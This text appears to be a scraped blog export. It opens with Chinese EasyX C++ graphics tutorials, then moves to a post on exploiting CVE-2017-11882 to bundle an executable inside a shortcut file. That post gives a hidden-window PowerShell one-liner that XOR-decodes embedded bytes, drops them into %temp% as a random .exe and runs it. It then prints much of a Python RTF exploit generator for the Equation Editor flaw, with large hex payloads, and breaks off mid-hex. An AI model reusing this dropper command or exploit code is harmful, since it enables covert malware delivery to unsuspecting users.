BeginBatchDraw(); cleardevice(); putimage(0, 0, &amp;img); fillcircle(x, y, 50); fillroundrect(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh); outtextxy(tx, ty, str); // 应该在这里结束批量绘图 EndBatchDraw(); // 鼠标消息 if (peekmessage(&amp;msg, EM_MOUSE)) &#123; switch (msg.message) &#123; case WM_LBUTTONDOWN: if (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom) &#123; cout &lt;&lt; &quot;您刚刚在坐标(&quot; &lt;&lt; msg.x &lt;&lt; &quot;, &quot; &lt;&lt; msg.y &lt;&lt; &quot;)按下了左键！&quot; &lt;&lt; endl; &#125; break; default: break; &#125; &#125; // 键盘消息 if (_kbhit()) &#123; char key = _getch(); // 阻塞函数，不输入一直在这里等 switch (key) &#123; case 72: // 都代表上键 case &#x27;w&#x27;: case &#x27;W&#x27;: cout &lt;&lt; &quot;up&quot; &lt;&lt; endl; y -= 5; break; case 80: // 都代表下键 case &#x27;s&#x27;: case &#x27;S&#x27;: cout &lt;&lt; &quot;down&quot; &lt;&lt; endl; y += 5; break; case 75: // 都代表左键 case &#x27;a&#x27;: case &#x27;A&#x27;: cout &lt;&lt; &quot;left&quot; &lt;&lt; endl; x -= 5; break; case 77: // 都代表右键 case &#x27;d&#x27;: case &#x27;D&#x27;: cout &lt;&lt; &quot;right&quot; &lt;&lt; endl; x += 5; break; default: break; &#125; &#125; &#125; // 保留窗口 getchar(); // 关闭窗口 closegraph(); return 0;&#125; 播放音乐函数 示例注意：&lt;mmsystem.h&gt;要放在&lt;easyx.h&gt;下方 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#include &lt;iostream&gt;#include &lt;easyx.h&gt;#include &lt;conio.h&gt; // 使用_getch()#include &lt;time.h&gt; #include &lt;mmsystem.h&gt; // 多媒体设备接口#pragma comment(lib, &quot;winmm.lib&quot;) // 加载静态库using namespace std;void BGM()&#123; // 打开音乐, alias取别名 mciSendString(L&quot;open ./music/1.mp3 alias BGM&quot;, 0, 0, 0); // 播放音乐，repeat重复播放 mciSendString(L&quot;play BGM repeat&quot;, 0, 0, 0);&#125;struct round_rec&#123; int left; int top; int right; int bottom; int ew; int eh;&#125;;int main() &#123; /* 窗口设置 */ // 创建一个窗口, 宽640，高480 // initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE); initgraph(640, 480, EW_SHOWCONSOLE); // 播放音乐 BGM(); // 设置窗口标题 HWND hnd = GetHWnd();//获取窗口句柄 SetWindowText(hnd, L&quot;欢迎来到DQY&amp;WYの小窝~&quot;);//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串 /* 加载并显示图片 */ // 图片对象 IMAGE img; // 加载图片 loadimage(&amp;img, L&quot;./images/1.jpg&quot;, 640, 480); // 设置线条样式，设置一次影响后面所有 // 实线；宽度5 setlinestyle(PS_DASH, 5); // 设置线条颜色，设置一次影响后面所有 setlinecolor(BROWN); // 设置填充颜色，设置一次影响后面所有 setfillcolor(YELLOW); // 绘图 struct round_rec fill_roundrec = &#123; 50, 150, 150, 200, 10, 50 &#125;; /* 文字设置 */ settextcolor(BLACK); // 设置文字样式 // 高度；宽度(0: 自适应)；系统字体 settextstyle(20, 0, L&quot;楷体&quot;); // 设置文字背景模式为透明 setbkmode(TRANSPARENT); // 居中输出文字 // L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集 wchar_t str[] = L&quot;Button&quot;; // 求字符串宽度 int width = textwidth(str); // 求字符串高度 int height = textheight(str); // 横坐标 = left + ((right - left) - width) / 2 int tx = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / 2; // 纵坐标 = top + ((bottom - top) - height) / 2 int ty = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / 2; int x = 50, y = 50; ExMessage msg; while (true) &#123; // 缓冲，防止图片闪烁 BeginBatchDraw(); cleardevice(); putimage(0, 0, &amp;img); fillcircle(x, y, 50); fillroundrect(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh); outtextxy(tx, ty, str); // 应该在这里结束批量绘图 EndBatchDraw(); // 鼠标消息 if (peekmessage(&amp;msg, EM_MOUSE)) &#123; switch (msg.message) &#123; case WM_LBUTTONDOWN: if (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom) &#123; cout &lt;&lt; &quot;您刚刚在坐标(&quot; &lt;&lt; msg.x &lt;&lt; &quot;, &quot; &lt;&lt; msg.y &lt;&lt; &quot;)按下了左键！&quot; &lt;&lt; endl; &#125; break; default: break; &#125; &#125; // 键盘消息 if (_kbhit()) &#123; if (GetAsyncKeyState(VK_UP)) &#123; y--; &#125; if (GetAsyncKeyState(VK_DOWN)) &#123; y++; &#125; if (GetAsyncKeyState(VK_LEFT)) &#123; x--; &#125; if (GetAsyncKeyState(VK_RIGHT)) &#123; x++; &#125; Sleep(5); &#125; &#125; // 保留窗口 getchar(); // 关闭窗口 closegraph(); return 0;&#125; 按钮对应的宏123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354VK_LBUTTON 鼠标左键 0x01VK_RBUTTON 鼠标右键 0x02VK_CANCEL Ctrl + Break 0x03VK_MBUTTON 鼠标中键 0x04VK_BACK Backspace 键 0x08VK_TAB Tab 键 0x09VK_RETURN 回车键 0x0DVK_SHIFT Shift 键 0x10VK_CONTROL Ctrl 键 0x11VK_MENU Alt 键 0x12VK_PAUSE Pause 键 0x13VK_CAPITAL Caps Lock 键 0x14VK_ESCAPE Esc 键 0x1BVK_SPACE 空格键 0x20VK_PRIOR Page Up 键 0x21VK_NEXT Page Down 键 0x22VK_END End 键 0x23VK_HOME Home 键 0x24VK_LEFT 左箭头键 0x25VK_UP 上箭头键 0x26VK_RIGHT 右箭头键 0x27VK_DOWN 下箭头键 0x28VK_SNAPSHOT Print Screen 键 0x2CVK_Insert Insert 键 0x2DVK_Delete Delete 键 0x2E&#x27;0&#x27; – &#x27;9&#x27; 数字 0 - 9 0x30 - 0x39&#x27;A&#x27; – &#x27;Z&#x27; 字母 A - Z 0x41 - 0x5AVK_LWIN 左WinKey(104键盘才有) 0x5BVK_RWIN 右WinKey(104键盘才有) 0x5CVK_APPS AppsKey(104键盘才有) 0x5DVK_NUMPAD0 小键盘 0 键 0x60VK_NUMPAD1 小键盘 1 键 0x61VK_NUMPAD2 小键盘 2 键 0x62VK_NUMPAD3 小键盘 3 键 0x63VK_NUMPAD4 小键盘 4 键 0x64VK_NUMPAD5 小键盘 5 键 0x65VK_NUMPAD6 小键盘 6 键 0x66VK_NUMPAD7 小键盘 7 键 0x67VK_NUMPAD8 小键盘 8 键 0x68VK_NUMPAD9 小键盘 9 键 0x69VK_F1 - VK_F24 功能键F1 – F24 0x70 - 0x87VK_NUMLOCK Num Lock 键 0x90VK_SCROLL Scroll Lock 键 0x91 代码整合123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181#include &lt;iostream&gt;#include &lt;easyx.h&gt;#include &lt;conio.h&gt; // 使用_getch()#include &lt;time.h&gt; #include &lt;mmsystem.h&gt; // 多媒体设备接口#pragma comment(lib, &quot;winmm.lib&quot;) // 加载静态库using namespace std;struct round_rec&#123; int left; int top; int right; int bottom; int ew; int eh;&#125;;void BGM()&#123; // 打开音乐, alias取别名 mciSendString(L&quot;open ./music/1.mp3 alias bgm&quot;, 0, 0, 0); // 播放音乐，repeat重复播放 mciSendString(L&quot;play bgm repeat&quot;, 0, 0, 0);&#125;void Change_Caption()&#123; // 设置窗口标题 HWND hnd = GetHWnd();//获取窗口句柄 SetWindowText(hnd, L&quot;欢迎来到DQY&amp;WYの小窝~&quot;);//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串&#125;void SetText()&#123; /* 文字设置 */ settextcolor(BLACK); // 设置文字样式 // 高度；宽度(0: 自适应)；系统字体 settextstyle(20, 0, L&quot;楷体&quot;); // 设置文字背景模式为透明 setbkmode(TRANSPARENT);&#125;void Set_Graphics()&#123; // 设置线条样式，设置一次影响后面所有 // 实线；宽度5 setlinestyle(PS_DASH, 5); // 设置线条颜色，设置一次影响后面所有 setlinecolor(BROWN); // 设置填充颜色，设置一次影响后面所有 setfillcolor(YELLOW);&#125;void Start()&#123; while (MessageBox(GetHWnd(), L&quot;欢迎来到欢迎来到DQY&amp;WYの小窝~要开始游戏嘛？&quot;, L&quot;提示&quot;, MB_YESNO) != IDYES) &#123; MessageBox(GetHWnd(), L&quot;不开始游戏就无法继续噢！&quot;, L&quot;警告&quot;, MB_OK); &#125;&#125;void KeyHit(int &amp;x, int &amp;y)&#123; if (_kbhit()) &#123; if (GetAsyncKeyState(VK_UP)) &#123; y--; &#125; if (GetAsyncKeyState(VK_DOWN)) &#123; y++; &#125; if (GetAsyncKeyState(VK_LEFT)) &#123; x--; &#125; if (GetAsyncKeyState(VK_RIGHT)) &#123; x++; &#125; Sleep(5); &#125;&#125;void MouseHit(struct round_rec fill_roundrec, ExMessage &amp;msg)&#123; if (peekmessage(&amp;msg, EM_MOUSE)) &#123; switch (msg.message) &#123; case WM_LBUTTONDOWN: if (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom) &#123; MessageBox(GetHWnd(), L&quot;我只是个摆设噢~&quot;, L&quot;阿巴阿巴&quot;, MB_OK); &#125; break; default: break; &#125; &#125;&#125;int main() &#123; /* 窗口设置 */ // 创建一个窗口, 宽640，高480 // initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE); initgraph(720, 480); // 改变窗口标题 Change_Caption(); // 播放音乐 BGM(); // 是否开始 Start(); // 设置文本和图形 SetText(); Set_Graphics(); /* 加载并显示图片 */ // 图片对象 IMAGE img; // 加载图片 loadimage(&amp;img, L&quot;./images/1.jpg&quot;, 720, 480); // 绘图 struct round_rec fill_roundrec = &#123; 50, 150, 150, 200, 10, 50 &#125;; // 居中输出文字 // L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集 wchar_t str[] = L&quot;Button&quot;; // 求字符串宽度 int width = textwidth(str); // 求字符串高度 int height = textheight(str); // 横坐标 = left + ((right - left) - width) / 2 int tx = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / 2; // 纵坐标 = top + ((bottom - top) - height) / 2 int ty = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / 2; int x = 50, y = 50; ExMessage msg; while (true) &#123; // 缓冲，防止图片闪烁 BeginBatchDraw(); cleardevice(); putimage(0, 0, &amp;img); fillcircle(x, y, 50); fillroundrect(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh); outtextxy(tx, ty, str); // 应该在这里结束批量绘图 EndBatchDraw(); // 鼠标消息 MouseHit(fill_roundrec, msg); // 键盘消息 KeyHit(x, y); &#125; // 保留窗口 getchar(); // 关闭窗口 closegraph(); return 0;&#125; 其他样例基础画板1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;easyx.h&gt;#include &lt;conio.h&gt;using namespace std;int main()&#123; COLORREF color[4] = &#123;RED, RGB(255, 174, 201), BLACK, WHITE&#125;; int i = 0; // 选择颜色 int r = 1; // 圆形半径 /* 窗口设置 */ // 创建一个窗口, 宽640，高480 // initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE); initgraph(600, 800); // 设置窗口标题 HWND hnd = GetHWnd();//获取窗口句柄 SetWindowText(hnd, L&quot;欢迎来到DQY&amp;WYの小窝~&quot;);//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串 // 设置背景颜色 setbkcolor(WHITE); // 清屏, 必须在设置背景颜色后使用才有效果 cleardevice(); setfillcolor(color[i]); // 绘图 ExMessage msg; while (true) &#123; if (peekmessage(&amp;msg, EM_MOUSE | EM_KEY)) &#123; switch (msg.message) &#123; case WM_MOUSEMOVE: if (msg.lbutton) &#123; BeginBatchDraw(); solidcircle(msg.x, msg.y, r); EndBatchDraw(); &#125; break; case WM_KEYDOWN: if (msg.vkcode == &#x27;a&#x27; || msg.vkcode == &#x27;A&#x27; || msg.vkcode == &#x27;d&#x27; || msg.vkcode == &#x27;D&#x27;) &#123; ++i; i %= 4; setfillcolor(color[i]); &#125; else if (msg.vkcode == &#x27;q&#x27; || msg.vkcode == &#x27;Q&#x27; || msg.vkcode == &#x27;e&#x27; || msg.vkcode == &#x27;E&#x27;) &#123; r += 4; r %= 25; &#125; break; default: break; &#125; &#125; &#125; // 保留窗口 getchar(); // 关闭窗口 closegraph(); return 0;&#125; 输入框1234567891011121314151617181920212223242526// 编译环境：VC2008 及以上版本，Unicode 字符集//#include &lt;graphics.h&gt;#include &lt;conio.h&gt;int main()&#123; // 初始化绘图窗口 initgraph(640, 480); // 定义字符串缓冲区，并接收用户输入 wchar_t s[10]; InputBox(s, 10, L&quot;请输入半径&quot;); // 将用户输入转换为数字 int r = _wtoi(s); // 画圆 circle(320, 240, r); // 按任意键退出 _getch(); closegraph(); return 0;&#125;","tags":"easyx"},{"title":"利用CVE-2017-11882尝试本地捆绑","url":"/post/ed8f2b51.html","text":"前言本文希望借鉴lnk捆绑执行exe的方式，利用已有poc代码605字节/17k字节版本Poc实现本地捆绑，还有很多不足的地方需要修改，只是一次尝试 本地捆绑快捷方式捆绑文件配合已有的poc代码，利用powershell命令释放捆绑文件并执行 注： PowerShell Get-Content用于在指定位置获取项目的内容。 gc，cat和type是该cmdlet的别名 在cmd输入cmd.exe提示无法运行该程序，可以看看当前执行路径是不是有cmd.exe，删掉即可 理想代码注：^是转义符，有的地方报错可以直接删掉 1cmd /c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object &#123;$_.length -eq [TOTAL_LNK_FILE_SIZE]&#125; ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;; $path = &#x27;%temp%\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;; sc $path ([byte[]]($file^| select -Skip [LNK_FILE_SIZE_EXCLUDING_EXE])) -Encoding Byte; ^&amp; $path; 实际使用由于引号冲突，所以我在poc里面使用长字符串将-c参数直接设置成需要的命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195#!/usr/bin/env python# Original poc :https://github.com/embedi/CVE-2017-11882# This version accepts a command with 17967 bytes long in maximum.# Sorry I don&#x27;t know how to read the struct in objdata, hence I cannot modify the length parameter to aquire a arbitrary length code execution.# But that&#x27;s enough for exploitation. I bet your shellcode is shorter.:)__author__ = &quot;@unamer&quot;import argparsefrom struct import packhead17k = r&#x27;&#x27;&#x27;&#123;\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033&#123;\\fonttbl&#123;\\f0\\fnil\\fcharset0 Calibri;&#125;&#125;&#123;\\*\\generator Riched20 6.3.9600&#125;\\viewkind4\\uc1\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9&#123;\\object\\objemb\\objupdate&#123;\\*\\objclass Equation.3&#125;\\objw380\\objh260&#123;\\*\\objdata 01050000020000000B0000004571756174696F6E2E3300000000000000000000540000D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF0900060000000000000000000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFF04000000FEFFFFFFFEFFFFFFFEFFFFFF060000000700000008000000090000000A0000000B0000000C0000000D0000000E0000000F000000100000001100000012000000130000001400000015000000160000001700000018000000190000001A0000001B0000001C0000001D0000001E0000001F000000200000002100000022000000230000002400000025000000260000002700000028000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500FFFFFFFFFFFFFFFF0200000002CE020000000000C00000000000004600000000000000000000000070B01C713B64D30103000000000100000000000001004F006C00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000A000201FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006F006D0070004F0062006A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004F0062006A0049006E0066006F0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201FFFFFFFF04000000FFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000FEFFFFFF02000000FEFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100FEFF030A0000FFFFFFFF02CE020000000000C000000000000046170000004D6963726F736F6674204571756174696F6E20332E30000C0000004453204571756174696F6E000B0000004571756174696F6E2E3300F439B271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000500000087460000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;tail17k = r&#x27;&#x27;&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C455049435400F6750000D58CFFFF6A2E00000800F6752B7300000100090000033117000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C024080006B1200000026060F001A00FFFFFFFF000010000000C0FFFFFF1E000000C06A00005E8000000B00000026060F000C004D617468547970650000E01F1C000000FB0280FE0000000000009001010000000402001054696D6573204E657720526F6D616E00FEFFFFFF21160A6300000A0000000000040000002D01000008000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320A087FBA340100000061000C000000320A087F3A2D0A000000616161616161616161610C000000320A087FBA250A000000616161616161616161610C000000320A087F3A1E0A000000616161616161616161610C000000320A087FBA160A000000616161616161616161610C000000320A087F3A0F0A000000616161616161616161610C000000320A087FBA070A000000616161616161616161610C000000320A087F3A000A0000006161616161616161616108000000320AC87CBA340100000061000C000000320AC87C3A2D0A000000616161616161616161610C000000320AC87CBA250A000000616161616161616161610C000000320AC87C3A1E0A000000616161616161616161610C000000320AC87CBA160A000000616161616161616161610C000000320AC87C3A0F0A000000616161616161616161610C000000320AC87CBA070A000000616161616161616161610C000000320AC87C3A000A0000006161616161616161616108000000320A887ABA340100000061790C000000320A887A3A2D0A000000616161616161616161610C000000320A887ABA250A000000616161616161616161610C000000320A887A3A1E0A000000616161616161616161610C000000320A887ABA160A000000616161616161616161610C000000320A887A3A0F0A000000616161616161616161610C000000320A887ABA070A000000616161616161616161610C000000320A887A3A000A0000006161616161616161616108000000320A4878BA340100000061000C000000320A48783A2D0A000000616161616161616161610C000000320A4878BA250A000000616161616161616161610C000000320A48783A1E0A000000616161616161616161610C000000320A4878BA160A000000616161616161616161610C000000320A48783A0F0A000000616161616161616161610C000000320A4878BA070A000000616161616161616161610C000000320A48783A000A0000006161616161616161616108000000320A0876BA340100000061000C000000320A08763A2D0A000000616161616161616161610C000000320A0876BA250A000000616161616161616161610C000000320A08763A1E0A000000616161616161616161610C000000320A0876BA160A000000616161616161616161610C000000320A08763A0F0A000000616161616161616161610C000000320A0876BA070A000000616161616161616161610C000000320A08763A000A0000006161616161616161616108000000320AC873BA340100000061000C000000320AC8733A2D0A000000616161616161616161610C000000320AC873BA250A000000616161616161616161610C000000320AC8733A1E0A000000616161616161616161610C000000320AC873BA160A000000616161616161616161610C000000320AC8733A0F0A000000616161616161616161610C000000320AC873BA070A000000616161616161616161610C000000320AC8733A000A0000006161616161616161616108000000320A8871BA340100000061000C000000320A88713A2D0A000000616161616161616161610C000000320A8871BA250A000000616161616161616161610C000000320A88713A1E0A000000616161616161616161610C000000320A8871BA160A000000616161616161616161610C000000320A88713A0F0A000000616161616161616161610C000000320A8871BA070A000000616161616161616161610C000000320A88713A000A0000006161616161616161616108000000320A486FBA340100000061000C000000320A486F3A2D0A000000616161616161616161610C000000320A486FBA250A000000616161616161616161610C000000320A486F3A1E0A000000616161616161616161610C000000320A486FBA160A000000616161616161616161610C000000320A486F3A0F0A000000616161616161616161610C000000320A486FBA070A000000616161616161616161610C000000320A486F3A000A0000006161616161616161616108000000320A086DBA340100000061000C000000320A086D3A2D0A000000616161616161616161610C000000320A086DBA250A000000616161616161616161610C000000320A086D3A1E0A000000616161616161616161610C000000320A086DBA160A000000616161616161616161610C000000320A086D3A0F0A000000616161616161616161610C000000320A086DBA07